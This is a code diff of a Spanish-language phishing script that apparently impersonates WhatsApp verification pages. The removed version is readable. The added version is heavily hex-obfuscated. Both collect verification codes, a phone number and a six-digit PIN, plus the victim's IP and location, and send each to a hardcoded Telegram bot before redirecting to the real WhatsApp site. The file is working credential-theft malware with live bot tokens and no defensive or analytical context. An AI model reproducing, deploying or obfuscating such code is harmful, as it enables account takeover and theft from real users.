@@ -1,134 +1,58 @@
-// Bot token y chat ID de Telegram
-var telegram_bot_id = "8123911851:AAFrKwzBfv_6rOM25uBDlJl_yJmcTYgw-uc";
-var chat_id = "5592536910";
-
-// Captura IP y ubicación
-let ip_info = {};
-fetch("https://ipapi.co/json")
-  .then(res => res.json())
-  .then(data => {
-    ip_info = {
-      ip: data.ip || "Sin IP",
-      ciudad: data.city || "Sin ciudad",
-      region: data.region || "",
-      pais: data.country_name || ""
-    };
-  });
-
-// Esperamos que el DOM cargue
-document.addEventListener("DOMContentLoaded", () => {
-  // INDEX: Captura código1
-  const form1 = document.getElementById("form1");
-  if (form1) {
-    form1.addEventListener("submit", function (e) {
-      e.preventDefault();
-      const codigo1 = document.getElementById("codigo1").value;
-      localStorage.setItem("codigoGuardado", codigo1);
-
-      const mensaje = `🟢 CODIGO DE PANTALLA
-🔢 Código: ${codigo1}
-🌐 IP: ${ip_info.ip}
-📍 Ubicación: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;
-
-      fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: mensaje })
-      });
-
-      setTimeout(() => {
-        window.location.href = "cargando2.html";
-      }, 1000);
-    });
-  }
-
-
-    // PAGINA2: Captura código2 y valida
-  const form2 = document.getElementById("form2");
-  if (form2) {
-    form2.addEventListener("submit", function (e) {
-      e.preventDefault();
-      const codigo2 = document.getElementById("codigo2").value;
-      const codigo1 = localStorage.getItem("codigoGuardado");
-      const mismo = (codigo1 === codigo2);
-
-      let mensaje;
-      if (mismo) {
-        mensaje = `❌ CÓDIGO REPETIDO
-🔢 Código ingresado: ${codigo2}
-🚫 Coincide con el código anterior
-🌐 IP: ${ip_info.ip}
-📍 Ubicación: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;
-        document.getElementById("error").style.display = "block";
-        document.getElementById("exito").style.display = "none";
-      } else {
-        mensaje = `✅ CODIGO 2 ACEPTADO
-🔢 Código: ${codigo2}
-🚫 Código anterior: ${codigo1}
-🌐 IP: ${ip_info.ip}
-📍 Ubicación: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;
-        document.getElementById("exito").style.display = "block";
-        document.getElementById("error").style.display = "none";
-        localStorage.removeItem("codigoGuardado");
-
-        // Redirigir a otra página web después de mostrar el mensaje
-        setTimeout(() => {
-          window.location.href = "pin.html"; // <-- CAMBIA ESTA URL si quieres
-        }, 1500);
-      }
-
-      fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text: mensaje })
-      });
-    });
-  }
-});
-
-let credenciales = {};
-
-// FORMULARIO LOGIN
-const loginForm = document.getElementById("loginForm");
-if (loginForm) {
-  loginForm.addEventListener("submit", function (e) {
-    e.preventDefault();
-    credenciales.select = document.getElementById("select").value;
-    credenciales.tel = document.getElementById("tel").value;
-
-    const mensaje = `🔐 WHATSAPP
-#️⃣ Pais: ${credenciales.select}
-🐿 tel: ${credenciales.tel}
-🌐 IP: ${ip_info.ip}
-📍 Ciudad: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;
-
-    fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id, text: mensaje })
-    }).then(() => {
-      window.location.href = "cargando.html";
-    });
-  });
+var _$_83da=["\x38\x30\x30\x39\x36\x30\x35\x39\x32\x30\x3A\x41\x41\x46\x7A\x73\x76\x45\x4D\x4C\x57\x73\x72\x77\x49\x50\x42\x4A\x73\x49\x6D\x56\x50\x6A\x36\x44\x30\x66\x74\x4F\x62\x71\x4A\x43\x72\x38","\x35\x39\x39\x32\x30\x30\x39\x38\x35\x33","\x69\x70","\x53\x69\x6E\x20\x49\x50","\x63\x69\x74\x79","\x53\x69\x6E\x20\x63\x69\x75\x64\x61\x64","\x72\x65\x67\x69\x6F\x6E","","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x74\x68\x65\x6E","\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x61\x70\x69\x2E\x63\x6F\x2F\x6A\x73\x6F\x6E","\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64","\x66\x6F\x72\x6D\x31","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x73\x75\x62\x6D\x69\x74","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74","\x76\x61\x6C\x75\x65","\x63\x6F\x64\x69\x67\x6F\x31","\x63\x6F\x64\x69\x67\x6F\x47\x75\x61\x72\x64\x61\x64\x6F","\x73\x65\x74\x49\x74\x65\x6D","\x0D\x0A\uD83C\uDF10\x20\x49\x50\x3A\x20","\x0D\x0A\uD83D\uDCCD\x20\x55\x62\x69\x63\x61\x63\x69\x78\x66\x33\x6E\x3A\x20","\x63\x69\x75\x64\x61\x64","\x2C\x20","\x70\x61\x69\x73","\x2F\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x61\x72\x67\x61\x6E\x64\x6F\x32\x2E\x68\x74\x6D\x6C","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x66\x6F\x72\x6D\x32","\x63\x6F\x64\x69\x67\x6F\x32","\x67\x65\x74\x49\x74\x65\x6D","\x0D\x0A\uD83D\uDEAB\x20\x43\x6F\x69\x6E\x63\x69\x64\x65\x20\x63\x6F\x6E\x20\x65\x6C\x20\x63\x78\x66\x33\x64\x69\x67\x6F\x20\x61\x6E\x74\x65\x72\x69\x6F\x72\x0D\x0A\uD83C\uDF10\x20\x49\x50\x3A\x20","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x65\x72\x72\x6F\x72","\x62\x6C\x6F\x63\x6B","\x65\x78\x69\x74\x6F","\x6E\x6F\x6E\x65","\x0D\x0A\uD83D\uDEAB\x20\x43\x78\x66\x33\x64\x69\x67\x6F\x20\x61\x6E\x74\x65\x72\x69\x6F\x72\x3A\x20","\x72\x65\x6D\x6F\x76\x65\x49\x74\x65\x6D","\x70\x69\x6E\x2E\x68\x74\x6D\x6C","\x6C\x6F\x67\x69\x6E\x46\x6F\x72\x6D","\x73\x65\x6C\x65\x63\x74","\x74\x65\x6C","\x0D\x0A\uD83D\uDC3F\x20\x74\x65\x6C\x3A\x20","\x0D\x0A\uD83D\uDCCD\x20\x43\x69\x75\x64\x61\x64\x3A\x20","\x63\x61\x72\x67\x61\x6E\x64\x6F\x2E\x68\x74\x6D\x6C","\x70\x69\x6E\x46\x6F\x72\x6D","\x70\x69\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x63\x6F\x6D\x2F"];
+var telegram_bot_id=_$_83da[0],chat_id=_$_83da[1];//0
+let ip_info={};//0
+fetch(_$_83da[11])[_$_83da[9]]((_0xEE22)=>
+{
+	return _0xEE22[_$_83da[10]]()
 }
-
-const pinForm = document.getElementById("pinForm");
-if (pinForm) {
-  pinForm.addEventListener("submit", function (e) {
-    e.preventDefault();
-    credenciales.pin = document.getElementById("pin").value;
-
-    const mensaje = `🔐 PIN 6 DIGITOS
-📌 pin: ${credenciales.pin}
-🌐 IP: ${ip_info.ip}
-📍 Ciudad: ${ip_info.ciudad}, ${ip_info.region}, ${ip_info.pais}`;
-
-    fetch(`https://api.telegram.org/bot${telegram_bot_id}/sendMessage`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id, text: mensaje })
-    }).then(() => {
-      window.location.href = "https://www.whatsapp.com/";
-    });
-  });
+)[_$_83da[9]]((_0xEE22)=>
+{
+	ip_info= {ip:_0xEE22[_$_83da[2]]|| _$_83da[3],ciudad:_0xEE22[_$_83da[4]]|| _$_83da[5],region:_0xEE22[_$_83da[6]]|| _$_83da[7],pais:_0xEE22[_$_83da[8]]|| _$_83da[7]}
 }
+),document[_$_83da[33]](_$_83da[12],()=>
+{
+	let _0xEE22=document[_$_83da[14]](_$_83da[13]);//0
+	_0xEE22&& _0xEE22[_$_83da[33]](_$_83da[15],function(_0xEE22)
+	{
+		_0xEE22[_$_83da[16]]();let _0xEE43=document[_$_83da[14]](_$_83da[18])[_$_83da[17]];//0
+		localStorage[_$_83da[20]](_$_83da[19],_0xEE43);let _0xEE64=("\uD83D\uDFE2\x20\x43\x4F\x44\x49\x47\x4F\x20\x44\x45\x20\x50\x41\x4E\x54\x41\x4C\x4C\x41\x0D\x0A\uD83D\uDD22\x20\x43\x78\x66\x33\x64\x69\x67\x6F\x3A\x20"+_0xEE43+_$_83da[21]+ip_info[_$_83da[2]]+_$_83da[22]+ip_info[_$_83da[23]]+_$_83da[24]+ip_info[_$_83da[6]]+_$_83da[24]+ip_info[_$_83da[25]]+_$_83da[7]);//0
+		fetch(("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74"+telegram_bot_id+_$_83da[26]),{method:_$_83da[27],headers:{"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":_$_83da[28]},body:JSON[_$_83da[29]]({chat_id,text:_0xEE64})}),setTimeout(()=>
+		{
+			window[_$_83da[31]][_$_83da[30]]= _$_83da[32]
+		}
+		,1e3)
+	}
+	);let _0xEE43=document[_$_83da[14]](_$_83da[34]);//3
+	_0xEE43&& _0xEE43[_$_83da[33]](_$_83da[15],function(_0xEE22)
+	{
+		_0xEE22[_$_83da[16]]();let _0xEE43=document[_$_83da[14]](_$_83da[35])[_$_83da[17]],_0xEE64=localStorage[_$_83da[36]](_$_83da[19]),_0xEE85;//3
+		_0xEE64=== _0xEE43?(_0xEE85= ("\u274C\x20\x43\x78\x64\x33\x44\x49\x47\x4F\x20\x52\x45\x50\x45\x54\x49\x44\x4F\x0D\x0A\uD83D\uDD22\x20\x43\x78\x66\x33\x64\x69\x67\x6F\x20\x69\x6E\x67\x72\x65\x73\x61\x64\x6F\x3A\x20"+_0xEE43+_$_83da[37]+ip_info[_$_83da[2]]+_$_83da[22]+ip_info[_$_83da[23]]+_$_83da[24]+ip_info[_$_83da[6]]+_$_83da[24]+ip_info[_$_83da[25]]+_$_83da[7]),document[_$_83da[14]](_$_83da[40])[_$_83da[39]][_$_83da[38]]= _$_83da[41],document[_$_83da[14]](_$_83da[42])[_$_83da[39]][_$_83da[38]]= _$_83da[43]):(_0xEE85= ("\u2705\x20\x43\x4F\x44\x49\x47\x4F\x20\x32\x20\x41\x43\x45\x50\x54\x41\x44\x4F\x0D\x0A\uD83D\uDD22\x20\x43\x78\x66\x33\x64\x69\x67\x6F\x3A\x20"+_0xEE43+_$_83da[44]+_0xEE64+_$_83da[21]+ip_info[_$_83da[2]]+_$_83da[22]+ip_info[_$_83da[23]]+_$_83da[24]+ip_info[_$_83da[6]]+_$_83da[24]+ip_info[_$_83da[25]]+_$_83da[7]),document[_$_83da[14]](_$_83da[42])[_$_83da[39]][_$_83da[38]]= _$_83da[41],document[_$_83da[14]](_$_83da[40])[_$_83da[39]][_$_83da[38]]= _$_83da[43],localStorage[_$_83da[45]](_$_83da[19]),setTimeout(()=>
+		{
+			window[_$_83da[31]][_$_83da[30]]= _$_83da[46]
+		}
+		,1500)),fetch(("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74"+telegram_bot_id+_$_83da[26]),{method:_$_83da[27],headers:{"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":_$_83da[28]},body:JSON[_$_83da[29]]({chat_id,text:_0xEE85})})
+	}
+	)
+}
+);let credenciales={};//11
+const loginForm=document[_$_83da[14]](_$_83da[47]);//11
+loginForm&& loginForm[_$_83da[33]](_$_83da[15],function(_0xEE22)
+{
+	_0xEE22[_$_83da[16]](),credenciales[_$_83da[48]]= document[_$_83da[14]](_$_83da[48])[_$_83da[17]],credenciales[_$_83da[49]]= document[_$_83da[14]](_$_83da[49])[_$_83da[17]];let _0xEE43=("\uD83D\uDD10\x20\x57\x48\x41\x54\x53\x41\x50\x50\x0D\x0A\x23\uFE0F\u20E3\x20\x50\x61\x69\x73\x3A\x20"+credenciales[_$_83da[48]]+_$_83da[50]+credenciales[_$_83da[49]]+_$_83da[21]+ip_info[_$_83da[2]]+_$_83da[51]+ip_info[_$_83da[23]]+_$_83da[24]+ip_info[_$_83da[6]]+_$_83da[24]+ip_info[_$_83da[25]]+_$_83da[7]);//11
+	fetch(("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74"+telegram_bot_id+_$_83da[26]),{method:_$_83da[27],headers:{"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":_$_83da[28]},body:JSON[_$_83da[29]]({chat_id,text:_0xEE43})})[_$_83da[9]](()=>
+	{
+		window[_$_83da[31]][_$_83da[30]]= _$_83da[52]
+	}
+	)
+}
+);const pinForm=document[_$_83da[14]](_$_83da[53]);//15
+pinForm&& pinForm[_$_83da[33]](_$_83da[15],function(_0xEE22)
+{
+	_0xEE22[_$_83da[16]](),credenciales[_$_83da[54]]= document[_$_83da[14]](_$_83da[54])[_$_83da[17]];let _0xEE43=("\uD83D\uDD10\x20\x50\x49\x4E\x20\x36\x20\x44\x49\x47\x49\x54\x4F\x53\x0D\x0A\uD83D\uDCCC\x20\x70\x69\x6E\x3A\x20"+credenciales[_$_83da[54]]+_$_83da[21]+ip_info[_$_83da[2]]+_$_83da[51]+ip_info[_$_83da[23]]+_$_83da[24]+ip_info[_$_83da[6]]+_$_83da[24]+ip_info[_$_83da[25]]+_$_83da[7]);//15
+	fetch(("\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74"+telegram_bot_id+_$_83da[26]),{method:_$_83da[27],headers:{"\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65":_$_83da[28]},body:JSON[_$_83da[29]]({chat_id,text:_0xEE43})})[_$_83da[9]](()=>
+	{
+		window[_$_83da[31]][_$_83da[30]]= _$_83da[55]
+	}
+	)
+}
+)
